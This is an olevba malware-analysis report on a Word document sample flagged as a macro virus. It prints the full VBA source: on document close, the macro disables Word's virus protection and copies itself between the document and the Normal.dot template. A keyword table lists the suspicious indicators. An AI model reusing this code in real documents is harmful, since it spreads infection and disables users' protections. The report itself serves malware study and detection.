olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Example.d-bc0d33f7a8e284d8011561f6c5612739bbc852c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Example.d-bc0d33f7a8e284d8011561f6c5612739bbc852c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cali.bas 
in file: Virus.MSWord.Example.d-bc0d33f7a8e284d8011561f6c5612739bbc852c8 - OLE stream: 'Macros/VBA/Cali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

Application.EnableCancelKey = False
Options.VirusProtection = False
'Application.CommandBars("Tools").Controls(13).Enabled = False
cadd1 = "California"
cadd2 = "Calidad"
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = Left(cadd1, 4) Then GoTo EndOfVirus
    Next i
    VSource = NormalTemplate.FullName
    VDestiny = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
     If NormalTemplate.VBProject.VBComponents(i).Name = Left(cadd2, 4) Then GoTo EndOfVirus
  Next i
  VSource = ActiveDocument.FullName
  VDestiny = NormalTemplate.FullName
End If

Application.OrganizerCopy VSource, VDestiny, Left(cadd2, 4), wdOrganizerObjectProjectItems
EndOfVirus:
MsgBox "Hola"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

